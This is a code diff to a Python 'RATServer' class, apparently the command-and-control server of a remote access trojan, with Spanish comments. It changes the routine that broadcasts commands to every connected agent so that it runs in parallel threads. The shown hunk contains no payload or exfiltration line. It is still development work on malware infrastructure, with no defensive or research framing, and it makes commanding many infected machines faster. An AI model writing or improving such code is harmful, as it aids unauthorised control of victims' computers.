@@ -127,15 +127,30 @@ class RATServer:
             return None
     
     def send_command_to_all(self, command, params=None):
-        """Envía un comando a todos los agentes conectados"""
+        """Envía un comando a todos los agentes conectados EN PARALELO"""
         results = {}
         agent_ids = list(self.agents.keys())
+        threads = []
         
-        for agent_id in agent_ids:
+        def send_to_agent(agent_id):
+            """Función auxiliar para enviar comando en un thread"""
             print(f"[*] Enviando comando a agente {agent_id}...")
             result = self.send_command(agent_id, command, params)
-            results[agent_id] = result
+            with self.lock:
+                results[agent_id] = result
         
+        # Crear y lanzar threads para todos los agentes
+        print(f"[*] Lanzando comando a {len(agent_ids)} agentes en paralelo...")
+        for agent_id in agent_ids:
+            thread = threading.Thread(target=send_to_agent, args=(agent_id,))
+            thread.start()
+            threads.append(thread)
+        
+        # Esperar a que todos los threads terminen
+        for thread in threads:
+            thread.join()
+        
+        print(f"[+] Todos los agentes han completado el comando")
         return results
     
     def disconnect_agent(self, agent_id):
